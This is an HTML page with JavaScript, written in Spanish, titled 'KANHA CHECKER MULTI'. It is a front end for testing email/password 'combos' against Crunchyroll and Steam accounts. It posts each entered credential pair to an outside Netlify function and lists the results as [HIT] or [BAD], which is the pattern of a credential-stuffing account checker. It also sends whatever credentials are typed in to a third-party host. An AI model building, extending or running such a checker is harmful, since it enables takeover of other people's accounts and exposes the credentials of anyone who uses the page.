<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KANHA CHECKER MULTI</title>
    <style>
        body { background: #0a0a0a; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
        .tabs { display: flex; justify-content: center; margin-bottom: 20px; }
        .tab { background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px 20px; cursor: pointer; font-family: monospace; font-weight: bold; }
        .tab.active { background: #0f0; color: #000; }
        input { width: 90%; max-width: 500px; padding: 12px; margin: 5px 0; background: #111; color: #0f0; border: 1px solid #0f0; font-family: monospace; font-size: 16px; }
        button.check { background: #0f0; color: #000; padding: 12px 30px; font-weight: bold; border: none; margin-top: 15px; cursor: pointer; font-size: 16px; }
        #result { background: #111; padding: 15px; margin-top: 20px; text-align: left; white-space: pre-wrap; border: 1px solid #333; max-width: 500px; margin-left: auto; margin-right: auto; font-size: 14px; }
        .hit { color: #0f0; } .bad { color: #f00; }
    </style>
</head>
<body>
    <h1>[ KANHA CHECKER ]</h1>
    
    <div class="tabs">
        <button id="tab-crunchyroll" class="tab active" onclick="setService('crunchyroll')">CRUNCHYROLL</button>
        <button id="tab-steam" class="tab" onclick="setService('steam')">STEAM</button>
    </div>

    <p id="hintText">Ingresá los datos de Crunchyroll:</p>
    <input type="email" id="emailInput" placeholder="correo@gmail.com"><br>
    <input type="password" id="passInput" placeholder="Contraseña"><br>
    <button class="check" onclick="startCheck()">INICIAR CHEQUEO</button>
    
    <div id="result">Esperando datos...</div>

    <script>
        let currentService = 'crunchyroll';

        function setService(service) {
            currentService = service;
            document.getElementById('tab-crunchyroll').className = service === 'crunchyroll' ? 'tab active' : 'tab';
            document.getElementById('tab-steam').className = service === 'steam' ? 'tab active' : 'tab';
            
            if (service === 'steam') {
                document.getElementById('hintText').innerText = "Ingresá los datos de Steam:";
                document.getElementById('emailInput').placeholder = "usuario_steam";
            } else {
                document.getElementById('hintText').innerText = "Ingresá los datos de Crunchyroll:";
                document.getElementById('emailInput').placeholder = "correo@gmail.com";
            }
        }

        async function startCheck() {
            const email = document.getElementById('emailInput').value.trim();
            const pass = document.getElementById('passInput').value.trim();
            const resultDiv = document.getElementById('result');
            
            if (!email || !pass) return resultDiv.innerHTML = "<span class='bad'>Poné los datos, AGENT man.</span>";
            
            resultDiv.innerHTML = "Chequeando " + currentService + "... (puede tardar)";
            try {
                const res = await fetch("https://fascinating-panda-466eb7.netlify.app/.netlify/functions/check", {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ service: currentService, combos: [`${email}:${pass}`] })
                });
                const data = await res.json();
                
                if (!data.results) {
                    resultDiv.innerHTML = `<span class='bad'>Error del Backend: ${JSON.stringify(data)}</span>`;
                    return;
                }

                let html = "";
                data.results.forEach(r => {
                    if (r.valid) {
                        html += `<span class="hit">[HIT] ${r.email} | ${r.reason}</span>\n`;
                    } else {
                        html += `<span class="bad">[BAD] ${r.email} | ${r.reason}</span>\n`;
                    }
                });
                resultDiv.innerHTML = html;
            } catch (e) {
                resultDiv.innerHTML = `<span class='bad'>Error de conexión: ${e.message}</span>`;
            }
        }
    </script>
</body>
</html>
